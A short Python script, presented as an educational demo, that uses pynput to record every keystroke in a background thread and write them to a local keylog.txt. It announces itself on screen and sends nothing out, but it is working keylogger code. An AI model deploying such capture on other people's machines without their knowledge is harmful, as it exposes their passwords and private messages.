#!/usr/bin/env python3
"""
Keyboard Monitoring Demo
Educational script showing keyboard input monitoring patterns
"""
import threading
import time
from pynput import keyboard

# Global variables
keys_pressed = []
is_monitoring = False

def on_press(key):
    """
    Callback function when a key is pressed
    Logs the key to the global list
    """
    try:
        keys_pressed.append(key.char)
    except AttributeError:
        keys_pressed.append(str(key))

def on_release(key):
    """
    Callback function when a key is released
    """
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_background_monitor():
    """
    Starts keyboard monitoring in background thread
    """
    global is_monitoring
    is_monitoring = True
    
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    
    listener.start()
    
    while is_monitoring:
        time.sleep(0.1)
        if len(keys_pressed) > 100:
            # Log captured keys
            with open('keylog.txt', 'a') as f:
                f.write(''.join(keys_pressed))
            keys_pressed.clear()

if __name__ == "__main__":
    print("Keyboard Monitor Demo")
    print("This demonstrates keyboard monitoring patterns")
    print("Press ESC to stop")
    
    # Start monitoring in background
    monitor_thread = threading.Thread(target=start_background_monitor, daemon=True)
    monitor_thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        is_monitoring = False
        print("\nMonitoring stopped")
